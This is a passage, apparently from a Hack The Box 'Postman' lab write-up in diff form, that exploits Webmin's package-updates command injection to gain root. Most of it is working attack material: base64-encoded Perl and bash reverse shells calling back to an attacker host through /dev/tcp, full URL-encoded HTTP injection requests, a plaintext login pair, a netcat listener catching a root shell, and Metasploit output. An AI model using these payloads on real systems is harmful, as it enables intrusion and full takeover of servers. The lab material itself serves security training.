+&u= | bash -c "{echo,cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xODo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Oyc=}|{base64,-d}|{bash,-i}"&ok_top=Update+Selected+Packages
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+└──╼ $echo -n "cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xODo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Oyc=" | base64 -d
+perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.18:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+POST /package-updates/update.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: sid=6853fe1fe9ecb57f3d75e93b41559027
+Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 440
+Connection: close
+
+u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xODo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages
+====================================================================================================================================
+
+Looks like the actual payload does not like spaces. Hence why brackets and commas are used. We can't use pipes within brackets and
+we need a certain string "u=acl%2Fapt&u=" before the payload is encoded. To have it run successfully for a bash shell use the follwoing
+Command Output:
+====================================================================================================================================
+BASE64 ENOCODE PAYLOAD:
+┌─[user@parrot-virtual]─[~/htb/postman]
+└──╼ $echo -n "bash -c 'bash -i &> /dev/tcp/10.10.14.18/9001 0>&1'" | base64
+YmFzaCAtYyAnYmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEn
+..
+..
+..
+..
+
+u=acl%2Fapt&u= | bash -c "{echo,YmFzaCAtYyAnYmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA+JjEn}|{base64,-d}|{bash,-i}"&ok_top=Update+Selected+Packages
+====================================================================================================================================
+
+URL ENCODE IT
+Commands and Output:
+====================================================================================================================================
+POST /package-updates/update.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: sid=ba1a69db65df8838d4e26732d12b19b9
+Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 158
+Connection: close
+
+u=acl%2Fapt&u=+|+bash+-c+"{echo,YmFzaCAtYyAnYmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAxIDA%2bJjEn}|{base64,-d}|{bash,-i}"&ok_top=Update+Selected+Packages
+====================================================================================================================================
+
+USE NETCAT TO LISTEN FOR BASH SHELL
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/postman/keys]
+└──╼ $nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.160] 49060
+bash: cannot set terminal process group (743): Inappropriate ioctl for device
+bash: no job control in this shell
+root@Postman:/usr/share/webmin/package-updates/# whoami
+whoami
+root
+root@Postman:/usr/share/webmin/package-updates/#
+====================================================================================================================================
+STEP 1:
+Commands and Output:
+====================================================================================================================================
+POST /session_login.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: testing=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+Connection: close
+
+page=&user=Matt&pass=computer2008
+====================================================================================================================================
+
+STEP 2: GET COOKIE
+Commands and Output:
+====================================================================================================================================
+POST /proc/index_tree.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: sid=c36719042ebbfafa527bbfb232f9868e
+Referer: https://10.10.10.160:10000/sysinfo.cgi?xnavigation=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+Connection: close
+====================================================================================================================================
+
+STEP3: CREATE PAYLOAD
+Commands and Output:
+====================================================================================================================================
+POST /package-updates/update.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: sid=6fa80b136dcad31fb418dc5e6497c300
+Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 440
+Connection: close
+
+u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xODo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages
+====================================================================================================================================
+
+STEP 4: WAIT FOR SHELL AND PROFIT
+Commands and Output:
+====================================================================================================================================
+msf6 exploit(linux/http/webmin_packageup_rce) > run
+
+[*] Started reverse TCP handler on 10.10.14.18:4444 
+[+] Session cookie: 6fa80b136dcad31fb418dc5e6497c300
+[*] Attempting to execute the payload...
+[*] Command shell session 3 opened (10.10.14.18:4444 -> 10.10.10.160:44058) at 2021-05-11 19:22:07 -0700
+
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
